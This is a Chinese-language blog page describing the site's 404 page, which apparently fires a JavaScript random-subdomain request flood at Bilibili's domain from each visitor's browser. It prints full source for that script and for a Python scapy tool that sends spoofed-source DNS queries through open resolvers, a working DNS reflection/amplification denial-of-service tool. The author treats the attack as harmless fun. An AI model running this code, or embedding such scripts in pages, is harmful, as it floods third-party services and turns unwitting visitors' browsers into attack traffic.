---
layout: page
permalink: "404page.html"
title:  "关于404页面"
---

大家在访问本站没有的页面时是不是会跳转到404页面呢？细心的人肯定会发现网页下方有一段话

>事实上你访问一次404页面就相当于攻击了b站200次哦~

很有趣对吧？

实际上这是使用了cnBeining的DNSTester。源码如下：

{% highlight python %}
#!/usr/bin/env python
#coding:utf-8
# Author:  Beining --<>
# Purpose: A most easy but powerful DNS tester
# Created: 01/15/2015

import os
import sys
import socket
import random
from multiprocessing.dummy import Pool as ThreadPool
from scapy import *
from scapy.all import *
import csv

global DNS_IP_LIST
DNS_IP_LIST = []
global FAKE_IP
FAKE_IP = ''
global SUCCESS
SUCCESS = 0

#----------------------------------------------------------------------
def dns_amp(qname_address):
    """"""
    global SUCCESS
    dns_ip = random.choice(DNS_IP_LIST)
    a = IP(dst=dns_ip,src=FAKE_IP) 
    b = UDP(dport=53)
    c = DNS(id=1,qr=0,opcode=0,tc=0,rd=1,qdcount=1,ancount=0,nscount=0,arcount=0)
    c.qd=DNSQR(qname=qname_address,qtype=1,qclass=1)
    p = a/b/c
    try:
        send(p)
        SUCCESS += 1
    except KeyboardInterrupt:
        print('FATAL: Quit!')
        print('Success: ' + str(SUCCESS))
        exit()
    except Exception as e:
        print('WARNING: DNSTest failed: %s' % e)
        traceback.print_exc()

#----------------------------------------------------------------------
def main(address, time, length, thread_num, fake_ip):
    """"""
    domain_list = [''.join(map(lambda xx:(hex(ord(xx))[2:]),os.urandom(int(length)))) + '.' + str(address) for i in range(int(time))]
    pool = ThreadPool(int(thread_num))
    results = pool.map(dns_amp, domain_list)
    #close the pool and wait for the work to finish 
    pool.close() 
    pool.join()

#----------------------------------------------------------------------
def read_dns_ip(filename = './nameservers.csv'):
    """"""
    dns_ip_list = []
    with open(filename, 'rb') as f:
        reader = csv.reader(f)
        for row in reader:
            if reader.line_num == 1:  
                    continue
            dns_ip_list.append(row[0])
    return dns_ip_list

#----------------------------------------------------------------------
if __name__=='__main__':
    address = str(sys.argv[1])
    time = int(sys.argv[2])
    thread_num = int(sys.argv[3])
    try:
        FAKE_IP = str(sys.argv[4])
    except:
        FAKE_IP = socket.getaddrinfo("www." + address, 80, 0, 0, socket.SOL_TCP)[0][4][0]
    try:
        dns_filename = str(sys.argv[5])
    except:
        dns_filename = './nameservers.csv'
    try:
        length = int(sys.argv[6])
    except:
        length = random.randint(6, 32)
    print('Reading DNS IP list...')
    DNS_IP_LIST = read_dns_ip(dns_filename)
    print('Start!')
    main(address, time, length, thread_num, FAKE_IP)
    print('Done! Success: ' + str(SUCCESS))
{% endhighlight %}

当然这是python版本（[github](https://github.com/cnbeining/DNSTester)），我们网站用的是同样的javascript版本：

{% highlight javascript %}
/*!
 * DNSTester.js 0.0.35
 * https://github.com/cnbeining/DNSTester.js
 * http://www.cnbeining.com/
 *
 * Includes jQuery
 * http://jquery.com/
 * 
 * Copyright 2015 Beining
 * Released under the GNU GENERAL PUBLIC LICENSE Version 2
 * https://github.com/cnbeining/DNSTester.js/blob/master/LICENSE
 *
 */
var COUNT = 0;
var STARTTIME = (new Date).getTime();
var DOMAIN = ".baidu.com/"; //Change me in caller
var MAX_COUNT = 50000;  //Change me in caller
var TPS = 100;  //Change me in caller
var TIMERID = 0; //To stop the test
function makeid_old(length)
{
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for( var i=0; i < length; i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}
function makeid_new(len) {
    //Only avalable in new browsers
    var arr = new Uint8Array((len || 40) / 2);
    window.crypto.getRandomValues(arr);
    text = [].map.call(arr, function(n) { return n.toString(16); }).join("");
    return text;
}
makeid = makeid_new; //asserting
try {
    test_msg = makeid(5)
}
catch(err) {
    console.log("New function not supported! " + err);
    makeid = makeid_old;
}
function r_send2() {
    if ((MAX_COUNT < 1 || COUNT >= MAX_COUNT) != true) {
          get("https://" + makeid(Math.floor((Math.random() * 64) + 1)) + DOMAIN) // NEVER FORGET, in case you use HTTPS
      };
    if (COUNT % 1000 == 0) { //report every 1000 times
          console.log('Done: ' + COUNT.toString())
      };
}
function get(a) {
    var b;
    $.ajax({
        url: a,
        dataType: "script",
        timeout: 1E-2, //So fail immediately, but good enough to stress DNS
        cache: !0,
        // beforeSend: function() {
        // requestTime = (new Date).getTime()
        // },
        complete: function() {
            COUNT += 1;
        }
        })
}
function r_send(a) {
    TIMERID = setInterval("r_send2()", a)
}
{% endhighlight %}

大家可以在[这里](/js/dnstester.js)或者[github](https://github.com/cnbeining/DNSTester.js)上找到源码和使用方式。

404页面中设置的只有2秒，每秒100次而已，对b站基本上一点影响也没有，除非有很多人大量访问404页面，同样也是不可能的，所以只是增加404娱乐性，大可不必担心。

点开右边侧栏中的cnBeining页面，你会发现更多有趣的东西~